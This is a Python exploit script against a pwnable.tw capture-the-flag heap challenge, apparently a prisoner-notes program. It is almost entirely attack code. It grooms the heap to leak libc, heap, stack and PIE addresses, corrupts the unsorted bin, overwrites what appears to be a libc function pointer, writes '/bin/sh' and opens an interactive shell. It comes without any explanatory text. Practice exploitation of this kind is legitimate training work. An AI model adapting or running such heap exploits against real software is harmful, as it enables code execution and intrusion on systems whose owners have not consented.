from PwnIOI import *
'''
High | string | string | number | indxex | string | size | note |next
'''
#s = remote('chall.pwnable.tw', 10400)
s = IOI(['chall.pwnable.tw',10400])
def add(cell,size,dat):
  s.read_until('> ')
  s.write('note\n')
  s.read_until('Cell: ')
  s.write(str(cell)+'\n')
  s.read_until('Size: ')
  s.write(str(size)+'\n')
  s.read_until('Note: ')
  s.write(dat)
def punish(cell):
  s.read_until('> ')
  s.write('punish\n')
  s.read_until('Cell')
  s.write(str(cell)+'\n')
add(0,256,'AAAA')
add(1,30,'BBBB')
add(0,1024,'AAAA')
add(2,30,'C')
s.read_until('> ')
s.write('list')
libc = u64(s.read_until('James')[0x3a4:0x3a4+6]+'\x00\x00')-0x3c3c43
log(" libc : 0x%x"%libc)
punish(0)
add(3,64,p64(libc+0x3c3b78+8))
s.read_until('> ')
s.write('list')
s.read_until('Prisoner: Gus Oakley ()')
heap = u64(s.read(13)[7:]+'\x00\x00') -0x12460#-0x2980 #- 0x13990
log(" heap : 0x%x"%heap)
add(3,64,p64(libc+0x3c5f38))
s.read_until('> ')
s.write('list')
s.read_until('Prisoner: Gus Oakley ()')
stack = u64(s.read(13)[7:]+'\x00\x00')
log(" stack : 0x%x"%stack)
add(3,64,p64(stack+0x100))#-0x8))
s.read_until('> ')
s.write('list')
s.read_until('Prisoner: Gus Oakley ()')
pie = u64(s.read(13)[7:]+'\x00\x00')- 0xfee #- 0x40
log(" pie : 0x%x"%pie)
unsortbin = heap + 0x12da0 -0x410
add(4,256,'4444')
add(5,1024,'555')
add(4,1024,'/bin/sh\x00')
add(3,64,p64(stack)+p64(0)*4+p64(0xffff)+p64(unsortbin))
add(0,1234,p64(0)+p64(pie+0x203021-0x10))
add(6,256,'\n')
add(3,64,p64(stack)+p64(0)*4+p64(0xffff)+p64(heap+0x120f0)+p64(pie+0x203000))
add(0,1234,p64(0x1))#+p64(0xffffffffffffffff))
add(libc>>32,1,'\n')#,p64(1)+p64(0xffffffffffffffff))
add(0,1234,p64(1)+p64(0xffffffffffffffff))
add(3,64,p64(stack)+p64(0)*4+p64(0xffff)+p64(libc+0x3c3b08)+p64(0))
add(0,1234,p64(libc+0x45390))
s.read_until('> ')
s.write('note')
s.read_until('Cell: ')
s.write('4\n')
s.read_until('Size: ')
s.write('4096')
s.interact()
